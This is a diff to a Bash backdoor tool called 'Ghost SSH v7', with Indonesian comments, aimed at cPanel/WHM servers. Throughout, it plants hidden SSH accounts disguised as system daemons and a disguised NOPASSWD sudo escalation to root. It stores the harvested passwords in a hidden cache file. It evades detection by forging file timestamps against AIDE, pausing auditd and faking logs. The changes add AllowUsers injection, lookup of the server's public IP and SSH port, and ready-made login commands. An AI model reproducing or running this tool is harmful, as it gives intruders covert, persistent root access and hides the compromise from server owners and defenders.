@@ -38,7 +38,7 @@ SESSION_CLEANER="/usr/local/cpanel/.session-clean"
 CLOUD_SUDOERS="/etc/sudoers.d/90-cloud-init-users"
 ESCALATION_SCRIPT="/usr/local/cpanel/scripts/cpanel-diag"
 
-CRED_FILE="/var/lib/systemd/.$(tr -dc 'a-f0-9' </dev/urandom | head -c10).cache"
+CRED_FILE="/var/lib/systemd/.$(openssl rand -hex 5 2>/dev/null || dd if=/dev/urandom bs=5 count=1 2>/dev/null | xxd -p | tr -d '\n').cache"
 
 GHOST_UID_START=200
 GHOST_UID_END=490
@@ -103,7 +103,13 @@ DAEMON_DB=(
 # ─────────────────────────────────────────────────────
 # HELPERS
 # ─────────────────────────────────────────────────────
-gen_pass() { tr -dc 'A-Za-z0-9@#$!%&_+-' </dev/urandom | head -c 18; echo; }
+gen_pass() {
+    local p=""
+    until [ "${#p}" -ge 18 ]; do
+        p+=$(openssl rand -base64 12 2>/dev/null | tr -dc 'A-Za-z0-9@#$!%&_+-')
+    done
+    echo "${p:0:18}"
+}
 
 # Random IP yang terlihat seperti IP publik eksternal (untuk fake log)
 rand_ip() {
@@ -211,6 +217,21 @@ DROPIN
         systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null
     }
     subph "sshd: password auth, zero Match User, zero AuthorizedKeysCommand"
+}
+
+# Tambahkan user ke AllowUsers jika directive itu ada di sshd_config
+allowusers_add() {
+    local user="$1"
+    local cfg="/etc/ssh/sshd_config"
+    if grep -qE "^AllowUsers\b" "$cfg"; then
+        # Cek user belum ada di list
+        if ! grep -qE "^AllowUsers\b.*\b${user}\b" "$cfg"; then
+            local orig; orig=$(stat -c '%y' "$cfg")
+            sed -i "s/^AllowUsers .*/& ${user}/" "$cfg"
+            touch -d "$orig" "$cfg" 2>/dev/null || true
+            subph "AllowUsers += $user"
+        fi
+    fi
 }
 
 # 1b: Session cleaner + escalation script
@@ -472,6 +493,7 @@ alias sudo='sudo '
 RC
     chown "${ROOT_GHOST_UID}:${ROOT_GHOST_UID}" "$ROOT_GHOST_HOME/.bashrc" 2>/dev/null || true
     install_logout_hook "$ROOT_GHOST_HOME" "$name"
+    allowusers_add "$name"
 
     CREATED_USERS+=("$name")
     printf '%s|%s' "$name" "$pass"
@@ -511,6 +533,7 @@ BASHRC
     chown "${uid}:${uid}" "$dhome/.bashrc" 2>/dev/null || true
 
     install_logout_hook "$dhome" "$dname"
+    allowusers_add "$dname"
     CREATED_USERS+=("$dname")
     printf '%s|%s|%s' "$dname" "$domain" "$pass"
 }
@@ -583,8 +606,23 @@ print_banner() {
 # MAIN
 # ═════════════════════════════════════════════════════
 print_banner
-info "WHM Log : $WHM_LOG"
-info "Stealth : ENABLED (default)"
+
+# Auto-detect SSH port dari proses sshd yang sedang berjalan
+SSH_PORT=$(ss -tlnp 2>/dev/null | grep '"sshd"' | awk '{print $4}' \
+           | grep -oE '[0-9]+$' | head -1)
+[ -z "$SSH_PORT" ] && SSH_PORT=$(grep -E "^Port\s+" /etc/ssh/sshd_config \
+                                  | awk '{print $2}' | head -1)
+SSH_PORT=${SSH_PORT:-22}
+
+# Auto-detect IP publik server
+SERVER_IP=$(curl -s --max-time 3 ifconfig.me 2>/dev/null \
+            || curl -s --max-time 3 api.ipify.org 2>/dev/null \
+            || hostname -I | awk '{print $1}')
+
+info "WHM Log   : $WHM_LOG"
+info "SSH Port  : $SSH_PORT"
+info "Server IP : $SERVER_IP"
+info "Stealth   : ENABLED (default)"
 echo ""
 
 # ── PHASE 0 ──────────────────────────────────────────
@@ -613,6 +651,7 @@ mkdir -p "$(dirname "$CRED_FILE")"
 cat > "$CRED_FILE" << HDR
 # Ghost SSH v7 — $(date)
 # Mode: Password Auth | Stealth: Surgical Replace
+# Server: ${SERVER_IP} | SSH Port: ${SSH_PORT}
 # WHM Log: $WHM_LOG
 # Total accounts: ${#ENTRIES[@]}
 # ═══════════════════════════════════════════════════════
@@ -630,23 +669,22 @@ root_result=$(create_ghost_root 2>/dev/null) && {
 ║  ROOT GHOST — Full Server Access                      ║
 ╠═══════════════════════════════════════════════════════╣
   Mode      : Ghost Root
-  ssh user  : ${rname}@<server-ip>
+  Login     : ssh -p ${SSH_PORT} ${rname}@${SERVER_IP}
   password  : ${rpass}
   identity  : cPanel Infrastructure Monitor (UID ${ROOT_GHOST_UID})
 
-  Escalation:
+  Escalation ke root:
     sudo ${ESCALATION_SCRIPT} --support-access
-    → drops ke /bin/bash sebagai root
 
-  sudo -l output (yang dilihat blue team):
+  sudo -l (yang dilihat blue team):
     (ALL) NOPASSWD: ${ESCALATION_SCRIPT}
-    → terlihat seperti monitoring diagnostic tool
 ╚═══════════════════════════════════════════════════════╝
 
 ROOT
     log "Ghost root: ${rname}"
-    dim "password  : ${rpass}"
-    dim "escalate  : sudo ${ESCALATION_SCRIPT} --support-access"
+    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} ${rname}@${SERVER_IP}"
+    dim "password : ${rpass}"
+    dim "escalate : sudo ${ESCALATION_SCRIPT} --support-access"
 } || warn "Ghost root: skip (sudah ada atau gagal)"
 
 # ── PHASE 4 ──────────────────────────────────────────
@@ -673,11 +711,11 @@ for entry in "${ENTRIES[@]}"; do
   Mode        : Ghost Isolated
   cPanel user : ${cpanel_user}
   Domain      : ${out_domain}
-  ssh user    : ${ghost}@${out_domain}
+  Login       : ssh -p ${SSH_PORT} ${ghost}@${SERVER_IP}
   password    : ${out_pass}
   scope       : /home/${cpanel_user}/ — isolated
 CRED
-    dim "ssh user : ${ghost}@${out_domain}"
+    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} ${ghost}@${SERVER_IP}"
     dim "password : ${out_pass}"
 done
 echo ""
@@ -696,6 +734,9 @@ done
 subph "5c: mtime restore (AIDE evasion)"
 mtime_restore_all
 
+subph "5c+: reload sshd (AllowUsers updated)"
+sshd -t && { systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null; } || true
+
 subph "5d: auditd resume"
 auditd_resume
 
@@ -713,7 +754,13 @@ echo ""
 echo -e "  ${B}Summary:${N}"
 echo "  ├─ Ghost isolated : ${success} users"
 echo "  ├─ Ghost root     : 1 (${ROOT_GHOST_NAME})"
+echo "  ├─ SSH Port       : ${SSH_PORT}"
+echo "  ├─ Server IP      : ${SERVER_IP}"
 echo "  └─ Credentials    : ${CRED_FILE}"
+echo ""
+echo -e "  ${B}Quick Access:${N}"
+echo "  ├─ Root ghost  : ssh -p ${SSH_PORT} ${ROOT_GHOST_NAME}@${SERVER_IP}"
+echo "  └─ Creds file  : cat ${CRED_FILE}"
 echo ""
 echo -e "  ${B}Stealth checklist:${N}"
 printf "  ├─ %-38s %s\n" "cat /etc/passwd"                 "daemon cPanel — wajar"
